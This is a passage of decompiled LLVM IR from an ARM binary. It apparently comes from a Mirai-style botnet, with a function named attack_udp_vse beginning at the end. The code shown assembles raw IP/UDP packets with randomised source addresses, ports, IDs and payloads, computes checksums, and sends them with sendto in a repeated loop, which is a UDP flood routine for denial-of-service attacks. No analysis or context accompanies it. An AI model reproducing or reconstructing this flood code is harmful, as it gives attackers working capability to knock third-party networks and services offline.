  %v4_bac4 = urem i32 %tmp56, 256
  %v5_bac4 = or i32 %v4_bac4, %v3_bab8
  store i32 %v5_bac4, i32* @lr, align 4
  %tmp57 = udiv i32 %v0_ba44, 256
  %v4_bac8 = urem i32 %tmp57, 256
  %v5_bac8 = or i32 %v4_bac8, %v3_babc
  store i32 %v5_bac8, i32* %r0.global-to-local, align 4
  %trunc = trunc i32 %v1_ba88 to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp58 = mul i32 %v8_b900, 256
  %v3_bad0 = and i32 %tmp58, 65280
  store i32 %v3_bad0, i32* %r2.global-to-local, align 4
  %tmp59 = udiv i32 %v8_b900, 256
  %v4_bae0 = urem i32 %tmp59, 256
  %v5_bae0 = or i32 %v4_bae0, %v3_bad0
  store i32 %v5_bae0, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul nuw i32 %v5_bac4, 65536
  %v4_bb54 = sdiv i32 %sext, 65536
  %sext6 = mul nuw i32 %v5_bac8, 65536
  %v7_bb88 = sdiv i32 %sext6, 65536
  %v1_bb48 = trunc i32 %v6_b918 to i8
  %v3_bb88 = sext i16 %rev to i32
  br label %dec_label_pc_bae8

dec_label_pc_bae8:                                ; preds = %.thread8, %dec_label_pc_ba7c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_baf4 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_baf4, i32* %r0.global-to-local, align 4
  store i32 %v2_b8c4, i32* %r3.global-to-local, align 4
  %v3_bafc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bafc, i32* %r1.global-to-local, align 4
  %v2_bb00 = load i32, i32* @r4, align 4
  %v5_bb00 = mul i32 %v2_bb00, 4
  %v6_bb00 = add i32 %v5_bb00, %v2_b8c4
  %v7_bb00 = inttoptr i32 %v6_bb00 to i32*
  store i32 %v2_baf4, i32* %v7_bb00, align 4
  %v0_bb04 = load i32, i32* %r3.global-to-local, align 4
  %v1_bb04 = load i32, i32* %r1.global-to-local, align 4
  %v4_bb04 = mul i32 %v1_bb04, 4
  %v5_bb04 = add i32 %v4_bb04, %v0_bb04
  %v6_bb04 = inttoptr i32 %v5_bb04 to i32*
  %v7_bb04 = load i32, i32* %v6_bb04, align 4
  store i32 %v7_bb04, i32* %r0.global-to-local, align 4
  %v1_bb08 = inttoptr i32 %v7_bb04 to i8*
  %v2_bb08 = load i8, i8* %v1_bb08, align 1
  %tmp = urem i8 %v2_bb08, 16
  %v1_bb0c = zext i8 %tmp to i32
  %v1_bb10 = or i32 %v1_bb0c, 64
  store i32 %v1_bb10, i32* %r3.global-to-local, align 4
  %v1_bb14 = trunc i32 %v1_bb10 to i8
  store i8 %v1_bb14, i8* %v1_bb08, align 1
  %v0_bb18 = load i32, i32* %r0.global-to-local, align 4
  %v1_bb18 = inttoptr i32 %v0_bb18 to i8*
  %v2_bb18 = load i8, i8* %v1_bb18, align 1
  %v1_bb1c = and i8 %v2_bb18, -16
  %v1_bb20 = or i8 %v1_bb1c, 5
  store i32 %v1_b944, i32* %ip.global-to-local, align 4
  %v0_bb28 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb28 = mul i32 %v0_bb28, 32
  store i32 %v3_bb28, i32* %r2.global-to-local, align 4
  store i8 %v1_bb20, i8* %v1_bb18, align 1
  %v0_bb30 = load i32, i32* %r1.global-to-local, align 4
  %v1_bb30 = add i32 %v0_bb30, 1
  store i32 %v1_bb30, i32* @r4, align 4
  %v0_bb34 = load i32, i32* %r2.global-to-local, align 4
  %tmp61 = mul i32 %v0_bb30, -8
  %v5_bb34 = add i32 %v0_bb34, %tmp61
  store i32 %v5_bb34, i32* %r2.global-to-local, align 4
  store i32 %v6_b8dc, i32* %r1.global-to-local, align 4
  %v2_bb3c = load i32, i32* %r0.global-to-local, align 4
  %v3_bb3c = add i32 %v2_bb3c, 1
  %v4_bb3c = inttoptr i32 %v3_bb3c to i8*
  store i8 %v5_b8fc, i8* %v4_bb3c, align 1
  store i32 %v1_b920, i32* %r3.global-to-local, align 4
  %v0_bb44 = load i32, i32* %ip.global-to-local, align 4
  %v2_bb44 = icmp eq i32 %v0_bb44, 0
  store i1 %v2_bb44, i1* %cpsr_z.global-to-local, align 1
  %v2_bb48 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb48 = add i32 %v2_bb48, 8
  %v4_bb48 = inttoptr i32 %v3_bb48 to i8*
  store i8 %v1_bb48, i8* %v4_bb48, align 1
  %v0_bb4c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bb4c, label %.thread8, label %bb60

bb60:                                             ; preds = %dec_label_pc_bae8
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_bb50 = load i32, i32* %r0.global-to-local, align 4
  %v4_bb50 = add i32 %v3_bb50, 6
  %v5_bb50 = inttoptr i32 %v4_bb50 to i16*
  store i16 64, i16* %v5_bb50, align 2
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_bae8, %bb60
  store i32 %v4_bb54, i32* %ip.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_bb5c = load i32, i32* %r0.global-to-local, align 4
  %v3_bb5c = add i32 %v2_bb5c, 9
  %v4_bb5c = inttoptr i32 %v3_bb5c to i8*
  store i8 17, i8* %v4_bb5c, align 1
  %v0_bb60 = load i32, i32* %ip.global-to-local, align 4
  %v1_bb60 = trunc i32 %v0_bb60 to i16
  %v2_bb60 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb60 = add i32 %v2_bb60, 2
  %v4_bb60 = inttoptr i32 %v3_bb60 to i16*
  store i16 %v1_bb60, i16* %v4_bb60, align 2
  store i32 %v6_b9cc, i32* %ip.global-to-local, align 4
  %v1_bb68 = load i32, i32* %r0.global-to-local, align 4
  %v2_bb68 = add i32 %v1_bb68, 12
  %v3_bb68 = inttoptr i32 %v2_bb68 to i32*
  store i32 %v6_b9cc, i32* %v3_bb68, align 4
  %v0_bb6c = load i32, i32* %r2.global-to-local, align 4
  %v1_bb6c = load i32, i32* @r8, align 4
  %v2_bb6c = add i32 %v1_bb6c, %v0_bb6c
  store i32 %v2_bb6c, i32* %r2.global-to-local, align 4
  %v1_bb70 = add i32 %v2_bb6c, 16
  %v2_bb70 = inttoptr i32 %v1_bb70 to i32*
  %v3_bb70 = load i32, i32* %v2_bb70, align 4
  store i32 %v3_bb70, i32* %r3.global-to-local, align 4
  %v0_bb74 = load i32, i32* @r5, align 4
  %v1_bb74 = trunc i32 %v0_bb74 to i16
  %v2_bb74 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb74 = add i32 %v2_bb74, 4
  %v4_bb74 = inttoptr i32 %v3_bb74 to i16*
  store i16 %v1_bb74, i16* %v4_bb74, align 2
  %v0_bb78 = load i32, i32* %r0.global-to-local, align 4
  %v1_bb78 = add i32 %v0_bb78, 20
  store i32 %v1_bb78, i32* %r1.global-to-local, align 4
  %v0_bb7c = load i32, i32* %r3.global-to-local, align 4
  %v2_bb7c = add i32 %v0_bb78, 16
  %v3_bb7c = inttoptr i32 %v2_bb7c to i32*
  store i32 %v0_bb7c, i32* %v3_bb7c, align 4
  %v0_bb80 = load i32, i32* @r6, align 4
  %v1_bb80 = trunc i32 %v0_bb80 to i16
  %v2_bb80 = load i32, i32* %r0.global-to-local, align 4
  %v3_bb80 = add i32 %v2_bb80, 20
  %v4_bb80 = inttoptr i32 %v3_bb80 to i16*
  store i16 %v1_bb80, i16* %v4_bb80, align 2
  store i32 %v3_bb88, i32* %r0.global-to-local, align 4
  store i32 %v7_bb88, i32* %r3.global-to-local, align 4
  %v0_bb8c = load i32, i32* @r4, align 4
  %v1_bb8c = load i32, i32* @r7, align 4
  %v9_bb8c = icmp eq i32 %v0_bb8c, %v1_bb8c
  store i1 %v9_bb8c, i1* %cpsr_z.global-to-local, align 1
  %v2_bb90 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb90 = add i32 %v2_bb90, 4
  %v4_bb90 = inttoptr i32 %v3_bb90 to i16*
  store i16 %rev, i16* %v4_bb90, align 2
  %v0_bb94 = load i32, i32* %r3.global-to-local, align 4
  %v1_bb94 = trunc i32 %v0_bb94 to i16
  %v2_bb94 = load i32, i32* %r1.global-to-local, align 4
  %v3_bb94 = add i32 %v2_bb94, 2
  %v4_bb94 = inttoptr i32 %v3_bb94 to i16*
  store i16 %v1_bb94, i16* %v4_bb94, align 2
  %v0_bb98 = load i32, i32* @r4, align 4
  store i32 %v0_bb98, i32* %stack_var_-44, align 4
  %v5_bb9c = icmp slt i32 %v0_bb8c, %v1_bb8c
  br i1 %v5_bb9c, label %dec_label_pc_bae8, label %dec_label_pc_bba0.preheader.loopexit

dec_label_pc_bba0.preheader.loopexit:             ; preds = %.thread8
  %v0_bba4.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_bba0.preheader

dec_label_pc_bba0.preheader:                      ; preds = %.thread, %dec_label_pc_bba0.preheader.loopexit
  %v0_bba4.pre = phi i32 [ %v0_bba4.pre.pre, %dec_label_pc_bba0.preheader.loopexit ], [ 0, %.thread ]
  %v3_bd0c = icmp eq i32 %v6_b9cc, -1
  %v8_bd0c = icmp eq i32 %v6_b9cc, -1
  %v9_bd24 = icmp eq i32 %v3_ba5c, ptrtoint (i16* @global_var_ffff.60 to i32)
  %v2_bd60 = icmp eq i32 %v1_b9b8, 0
  br label %dec_label_pc_bba0

dec_label_pc_bba0:                                ; preds = %dec_label_pc_bba0, %dec_label_pc_bca0, %dec_label_pc_bba0.preheader
  %v0_bba4 = phi i32 [ %v0_bba4.pre, %dec_label_pc_bba0.preheader ], [ 0, %dec_label_pc_bca0 ], [ 0, %dec_label_pc_bba0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bba4 = icmp eq i32 %v0_bba4, 0
  store i1 %v2_bba4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bba4, label %dec_label_pc_bba0, label %dec_label_pc_bbb0

dec_label_pc_bbb0:                                ; preds = %dec_label_pc_bba0, %dec_label_pc_bca0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bbb4

dec_label_pc_bbb4:                                ; preds = %dec_label_pc_bc1c, %dec_label_pc_bbb0
  %v1_bbc8 = phi i32 [ %v1_bc90, %dec_label_pc_bc1c ], [ 0, %dec_label_pc_bbb0 ]
  %v5_bbb8 = mul i32 %v1_bbc8, 24
  %v1_bbbc = load i32, i32* @r8, align 4
  %v2_bbbc = add i32 %v1_bbbc, %v5_bbb8
  store i32 %v2_bbbc, i32* %r3.global-to-local, align 4
  store i32 %v2_b8c4, i32* %r1.global-to-local, align 4
  %v1_bbc4 = add i32 %v2_bbbc, 20
  %v2_bbc4 = inttoptr i32 %v1_bbc4 to i8*
  %v3_bbc4 = load i8, i8* %v2_bbc4, align 1
  %v4_bbc4 = zext i8 %v3_bbc4 to i32
  store i32 %v4_bbc4, i32* %r2.global-to-local, align 4
  %v4_bbc8 = mul i32 %v1_bbc8, 4
  %v5_bbc8 = add i32 %v4_bbc8, %v2_b8c4
  %v6_bbc8 = inttoptr i32 %v5_bbc8 to i32*
  %v7_bbc8 = load i32, i32* %v6_bbc8, align 4
  store i32 %v7_bbc8, i32* @r5, align 4
  %v7_bbcc = icmp eq i8 %v3_bbc4, 31
  store i1 %v7_bbcc, i1* %cpsr_z.global-to-local, align 1
  %v1_bbd0 = add i32 %v7_bbc8, 20
  store i32 %v1_bbd0, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_bbc4, 32
  br i1 %tmp62, label %dec_label_pc_bcb4, label %dec_label_pc_bbd8

dec_label_pc_bbd8:                                ; preds = %dec_label_pc_bbb4
  store i32 %v6_b9cc, i32* %r3.global-to-local, align 4
  store i1 %v8_bd0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_bd0c, label %dec_label_pc_bd14, label %dec_label_pc_bbe4

dec_label_pc_bbe4:                                ; preds = %dec_label_pc_bcb4, %dec_label_pc_bbd8
  store i32 %v3_ba5c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* @r4, align 4
  store i1 %v9_bd24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bd24, label %dec_label_pc_bd30, label %dec_label_pc_bbf8

dec_label_pc_bbf8:                                ; preds = %dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge, %dec_label_pc_bbe4
  %v1_bbfc = phi i32 [ %v1_bbfc.pre, %dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge ], [ ptrtoint (i16* @global_var_ffff.60 to i32), %dec_label_pc_bbe4 ]
  store i32 %v3_ba3c, i32* %r0.global-to-local, align 4
  %v9_bbfc = icmp eq i32 %v3_ba3c, %v1_bbfc
  store i1 %v9_bbfc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bbfc, label %dec_label_pc_bd44, label %dec_label_pc_bc04

dec_label_pc_bc04:                                ; preds = %dec_label_pc_bd30, %dec_label_pc_bbf8
  %v1_bc08 = phi i32 [ %v1_bd3c, %dec_label_pc_bd30 ], [ %v1_bbfc, %dec_label_pc_bbf8 ]
  store i32 %v3_ba54, i32* %r1.global-to-local, align 4
  %v9_bc08 = icmp eq i32 %v3_ba54, %v1_bc08
  store i1 %v9_bc08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bc08, label %dec_label_pc_bd58, label %dec_label_pc_bc10

dec_label_pc_bc10:                                ; preds = %dec_label_pc_bd44, %dec_label_pc_bc04
  store i32 %v1_b9b8, i32* %r3.global-to-local, align 4
  store i1 %v2_bd60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bd60, label %dec_label_pc_bc1c, label %dec_label_pc_bd6c

dec_label_pc_bc1c:                                ; preds = %dec_label_pc_bc10, %dec_label_pc_bd58, %dec_label_pc_bd6c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_bc20 = load i32, i32* @r5, align 4
  %v3_bc20 = add i32 %v2_bc20, 10
  %v4_bc20 = inttoptr i32 %v3_bc20 to i16*
  store i16 0, i16* %v4_bc20, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bc28 = load i32, i32* @r5, align 4
  store i32 %v0_bc28, i32* @r0, align 4
  %v2_bc2c = call i32 @checksum_generic(i32 %v0_bc28, i32 20)
  %v3_bc2c = trunc i32 %v2_bc2c to i16
  %v3_bc30 = load i32, i32* @r5, align 4
  %v4_bc30 = add i32 %v3_bc30, 10
  %v5_bc30 = inttoptr i32 %v4_bc30 to i16*
  store i16 %v3_bc2c, i16* %v5_bc30, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_bc38 = load i32, i32* @r6, align 4
  %v3_bc38 = add i32 %v2_bc38, 6
  %v4_bc38 = inttoptr i32 %v3_bc38 to i16*
  store i16 0, i16* %v4_bc38, align 2
  %v0_bc3c = load i32, i32* @r6, align 4
  store i32 %v0_bc3c, i32* @r1, align 4
  %v1_bc40 = add i32 %v0_bc3c, 4
  %v2_bc40 = inttoptr i32 %v1_bc40 to i16*
  %v3_bc40 = load i16, i16* %v2_bc40, align 2
  %v4_bc40 = zext i16 %v3_bc40 to i32
  store i32 %v4_bc40, i32* %r2.global-to-local, align 4
  %v0_bc44 = load i32, i32* @sl, align 4
  store i32 %v0_bc44, i32* %r3.global-to-local, align 4
  %v0_bc48 = load i32, i32* @r5, align 4
  store i32 %v0_bc48, i32* %r0.global-to-local, align 4
  %v4_bc4c = call i32 @checksum_tcpudp(i32 %v0_bc48, i32 %v0_bc3c, i32 %v4_bc40, i32 %v0_bc44)
  %v5_bc4c = trunc i32 %v4_bc4c to i16
  store i32 %v4_bc4c, i32* %r0.global-to-local, align 4
  %v3_bc50 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bc50, i32* %r3.global-to-local, align 4
  %v3_bc54 = mul i32 %v3_bc50, 32
  store i32 %v3_bc54, i32* %lr.global-to-local, align 4
  %v3_bc58 = load i32, i32* @r6, align 4
  %v4_bc58 = add i32 %v3_bc58, 6
  %v5_bc58 = inttoptr i32 %v4_bc58 to i16*
  store i16 %v5_bc4c, i16* %v5_bc58, align 2
  %v0_bc5c = load i32, i32* %lr.global-to-local, align 4
  %v1_bc5c = load i32, i32* %r3.global-to-local, align 4
  %tmp63 = mul i32 %v1_bc5c, -8
  %v5_bc5c = add i32 %v0_bc5c, %tmp63
  store i32 %v5_bc5c, i32* %lr.global-to-local, align 4
  %v0_bc60 = load i32, i32* @r6, align 4
  %v1_bc60 = add i32 %v0_bc60, 2
  %v2_bc60 = inttoptr i32 %v1_bc60 to i16*
  %v3_bc60 = load i16, i16* %v2_bc60, align 2
  %v4_bc60 = zext i16 %v3_bc60 to i32
  store i32 %v4_bc60, i32* @r6, align 4
  %v1_bc64 = load i32, i32* @r8, align 4
  %v2_bc64 = add i32 %v1_bc64, %v5_bc5c
  store i32 %v2_bc64, i32* @lr, align 4
  %v3_bc68 = add i32 %v2_bc64, 2
  %v4_bc68 = inttoptr i32 %v3_bc68 to i16*
  store i16 %v3_bc60, i16* %v4_bc68, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_bc74 = load i32, i32* @r5, align 4
  store i32 %v0_bc74, i32* %r1.global-to-local, align 4
  %v0_bc78 = load i32, i32* @fp, align 4
  store i32 %v0_bc78, i32* %r0.global-to-local, align 4
  %v0_bc7c = load i32, i32* @sb, align 4
  store i32 %v0_bc7c, i32* %r2.global-to-local, align 4
  %v0_bc80 = load i32, i32* @lr, align 4
  %v6_bc88 = call i32 @__libc_sendto(i32 %v0_bc78, i32 %v0_bc74, i32 %v0_bc7c, i32 16384, i32 %v0_bc80, i32 16)
  %v3_bc8c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bc8c, i32* %r3.global-to-local, align 4
  %v1_bc90 = add i32 %v3_bc8c, 1
  store i32 %v1_bc90, i32* %r0.global-to-local, align 4
  %v1_bc94 = load i32, i32* @r7, align 4
  %v9_bc94 = icmp eq i32 %v1_bc90, %v1_bc94
  store i1 %v9_bc94, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bc90, i32* %stack_var_-44, align 4
  %v5_bc9c = icmp slt i32 %v1_bc90, %v1_bc94
  br i1 %v5_bc9c, label %dec_label_pc_bbb4, label %dec_label_pc_bca0

dec_label_pc_bca0:                                ; preds = %dec_label_pc_bc1c
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bca4 = icmp eq i32 %v1_bc94, 0
  store i1 %v2_bca4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bca4, label %dec_label_pc_bba0, label %dec_label_pc_bbb0

dec_label_pc_bcb4:                                ; preds = %dec_label_pc_bbb4
  %v1_bcb4 = add i32 %v2_bbbc, 16
  %v2_bcb4 = inttoptr i32 %v1_bcb4 to i32*
  %v3_bcb4 = load i32, i32* %v2_bcb4, align 4
  %v0_bcb8 = call i32 @rand_next()
  store i32 %v0_bcb8, i32* %r0.global-to-local, align 4
  %v3_bcbc = load i32, i32* %stack_var_-44, align 4
  %v5_bcc4 = mul i32 %v3_bcbc, 24
  %v1_bcc8 = and i32 %v3_bcb4, 16711680
  store i32 %v1_bcc8, i32* %ip.global-to-local, align 4
  %v3_bccc = udiv i32 %v3_bcb4, 16777216
  %v4_bcd0 = udiv i32 %v1_bcc8, 256
  %v5_bcd0 = or i32 %v4_bcd0, %v3_bccc
  store i32 %v5_bcd0, i32* %r2.global-to-local, align 4
  %v1_bcd4 = load i32, i32* @r8, align 4
  %v2_bcd4 = add i32 %v1_bcd4, %v5_bcc4
  store i32 %v2_bcd4, i32* %r1.global-to-local, align 4
  %v1_bcd8 = and i32 %v3_bcb4, ptrtoint (i32* @global_var_ff00.34 to i32)
  store i32 %v1_bcd8, i32* %r3.global-to-local, align 4
  %v1_bcdc = add i32 %v2_bcd4, 20
  %v2_bcdc = inttoptr i32 %v1_bcdc to i8*
  %v3_bcdc = load i8, i8* %v2_bcdc, align 1
  %v4_bcdc = zext i8 %v3_bcdc to i32
  store i32 %v4_bcdc, i32* %ip.global-to-local, align 4
  %v4_bce0 = mul i32 %v1_bcd8, 256
  %v4_bce4 = mul i32 %v3_bcb4, 16777216
  %v5_bce0 = or i32 %v4_bce0, %v4_bce4
  %v5_bce4 = or i32 %v5_bce0, %v5_bcd0
  %v7_bce8 = lshr i32 %v0_bcb8, %v4_bcdc
  %v8_bce8 = add i32 %v7_bce8, %v5_bce4
  store i32 %v8_bce8, i32* %r2.global-to-local, align 4
  %v1_bcec = and i32 %v8_bce8, 16711680
  store i32 %v1_bcec, i32* %r0.global-to-local, align 4
  %v1_bcf8 = and i32 %v8_bce8, 65280
  store i32 %v1_bcf8, i32* %r1.global-to-local, align 4
  %v5_bd00 = call i32 @llvm.bswap.i32(i32 %v8_bce8)
  %v1_bd04 = load i32, i32* @r5, align 4
  %v2_bd04 = add i32 %v1_bd04, 16
  %v3_bd04 = inttoptr i32 %v2_bd04 to i32*
  store i32 %v5_bd00, i32* %v3_bd04, align 4
  store i32 %v6_b9cc, i32* %r3.global-to-local, align 4
  store i1 %v8_bd0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_bd0c, label %dec_label_pc_bd14, label %dec_label_pc_bbe4

dec_label_pc_bd14:                                ; preds = %dec_label_pc_bcb4, %dec_label_pc_bbd8
  %v0_bd14 = call i32 @rand_next()
  store i32 %v0_bd14, i32* %r0.global-to-local, align 4
  store i32 %v3_ba5c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* @r4, align 4
  store i1 %v9_bd24, i1* %cpsr_z.global-to-local, align 1
  %v1_bd28 = load i32, i32* @r5, align 4
  %v2_bd28 = add i32 %v1_bd28, 12
  %v3_bd28 = inttoptr i32 %v2_bd28 to i32*
  store i32 %v0_bd14, i32* %v3_bd28, align 4
  br i1 %v9_bd24, label %dec_label_pc_bd30, label %dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge

dec_label_pc_bd14.dec_label_pc_bbf8_crit_edge:    ; preds = %dec_label_pc_bd14
  %v1_bbfc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bbf8

dec_label_pc_bd30:                                ; preds = %dec_label_pc_bd14, %dec_label_pc_bbe4
  %v0_bd30 = call i32 @rand_next()
  %v1_bd30 = trunc i32 %v0_bd30 to i16
  %v3_bd34 = load i32, i32* @r5, align 4
  %v4_bd34 = add i32 %v3_bd34, 4
  %v5_bd34 = inttoptr i32 %v4_bd34 to i16*
  store i16 %v1_bd30, i16* %v5_bd34, align 2
  store i32 %v3_ba3c, i32* %r0.global-to-local, align 4
  %v1_bd3c = load i32, i32* @r4, align 4
  %v9_bd3c = icmp eq i32 %v3_ba3c, %v1_bd3c
  store i1 %v9_bd3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bd3c, label %dec_label_pc_bd44, label %dec_label_pc_bc04

dec_label_pc_bd44:                                ; preds = %dec_label_pc_bd30, %dec_label_pc_bbf8
  %v0_bd44 = call i32 @rand_next()
  %v1_bd44 = trunc i32 %v0_bd44 to i16
  store i32 %v0_bd44, i32* %r0.global-to-local, align 4
  store i32 %v3_ba54, i32* %r1.global-to-local, align 4
  %v1_bd4c = load i32, i32* @r4, align 4
  %v9_bd4c = icmp eq i32 %v3_ba54, %v1_bd4c
  store i1 %v9_bd4c, i1* %cpsr_z.global-to-local, align 1
  %v3_bd50 = load i32, i32* @r5, align 4
  %v4_bd50 = add i32 %v3_bd50, 20
  %v5_bd50 = inttoptr i32 %v4_bd50 to i16*
  store i16 %v1_bd44, i16* %v5_bd50, align 2
  br i1 %v9_bd4c, label %dec_label_pc_bd58, label %dec_label_pc_bc10

dec_label_pc_bd58:                                ; preds = %dec_label_pc_bd44, %dec_label_pc_bc04
  %v0_bd58 = call i32 @rand_next()
  %v1_bd58 = trunc i32 %v0_bd58 to i16
  store i32 %v0_bd58, i32* %r0.global-to-local, align 4
  store i32 %v1_b9b8, i32* %r3.global-to-local, align 4
  store i1 %v2_bd60, i1* %cpsr_z.global-to-local, align 1
  %v3_bd64 = load i32, i32* @r6, align 4
  %v4_bd64 = add i32 %v3_bd64, 2
  %v5_bd64 = inttoptr i32 %v4_bd64 to i16*
  store i16 %v1_bd58, i16* %v5_bd64, align 2
  br i1 %v2_bd60, label %dec_label_pc_bc1c, label %dec_label_pc_bd6c

dec_label_pc_bd6c:                                ; preds = %dec_label_pc_bc10, %dec_label_pc_bd58
  %v0_bd6c = load i32, i32* @r5, align 4
  %v1_bd6c = add i32 %v0_bd6c, 28
  store i32 %v1_bd6c, i32* @r0, align 4
  store i32 %v0_ba84, i32* %r1.global-to-local, align 4
  %v2_bd74 = call i32 @rand_str(i32 %v1_bd6c, i32 %v0_ba84)
  store i32 %v2_bd74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bc1c

dec_label_pc_bd7c:                                ; preds = %dec_label_pc_b9f0
  %v0_bd7c = load i32, i32* @fp, align 4
  store i32 %v0_bd7c, i32* %r0.global-to-local, align 4
  %v1_bd80 = call i32 @__GI___libc_close(i32 %v0_bd7c)
  store i32 %v1_bd80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bd84

dec_label_pc_bd84:                                ; preds = %entry, %dec_label_pc_bd7c
  %v1_bd8c = phi i32 [ %v3_b9e0, %entry ], [ %v1_bd80, %dec_label_pc_bd7c ]
  store i32 %v18_b8a8, i32* %sb.global-to-local, align 4
  store i32 %v27_b8a8, i32* %lr.global-to-local, align 4
  ret i32 %v1_bd8c

; uselistorder directives
  uselistorder i32 %v0_bd58, { 1, 0 }
  uselistorder i32 %v0_bd44, { 1, 0 }
  uselistorder i32 %v1_bd3c, { 1, 0 }
  uselistorder i32 %v3_bcb4, { 3, 1, 2, 0 }
  uselistorder i32 %v1_bc90, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_bc5c, { 1, 0 }
  uselistorder i32 %v4_bc4c, { 1, 0 }
  uselistorder i1 %v2_bd60, { 2, 3, 1, 0 }
  uselistorder i1 %v9_bd24, { 2, 3, 1, 0 }
  uselistorder i32 %v3_bad0, { 1, 0 }
  uselistorder i16 %rev, { 1, 0 }
  uselistorder i32 %v3_bab8, { 1, 0 }
  uselistorder i32 %v1_ba88, { 1, 0, 2 }
  uselistorder i32 %v1_ba84, { 1, 0, 2 }
  uselistorder i32 %v3_ba5c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_ba44, { 1, 0, 2, 3 }
  uselistorder i32 %v3_ba3c, { 4, 3, 2, 1, 5, 0 }
  uselistorder i32 %v0_ba34, { 1, 0, 2 }
  uselistorder i32 %v0_ba84, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32 %v3_ba24, { 3, 1, 2, 0 }
  uselistorder i1 %v7_ba10, { 1, 0 }
  uselistorder i1 %v7_b9e4, { 1, 0 }
  uselistorder i32 %v3_b9e0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_b9cc, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v1_b9b8, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v1_b944, { 1, 2, 0 }
  uselistorder i32 %v1_b920, { 2, 1, 0 }
  uselistorder i32 %v6_b918, { 1, 0 }
  uselistorder i32 %v8_b900, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_b8dc, { 2, 1, 3, 0 }
  uselistorder i32 %v2_b8c4, { 0, 3, 1, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 24, 23, 25, 26, 28, 27, 30, 29, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 6, 4, 8, 7, 10, 9, 11, 14, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 33, 29, 30, 31, 32, 34, 36, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 0 }
  uselistorder i32 (i32, i32)* @rand_str, { 10, 9, 8, 7, 0, 6, 5, 4, 1, 3, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bd84, { 1, 0 }
  uselistorder label %dec_label_pc_bd6c, { 1, 0 }
  uselistorder label %dec_label_pc_bc1c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_bbb0, { 1, 0 }
  uselistorder label %dec_label_pc_bba0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_bba0.preheader, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
}

define i32 @attack_udp_vse(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
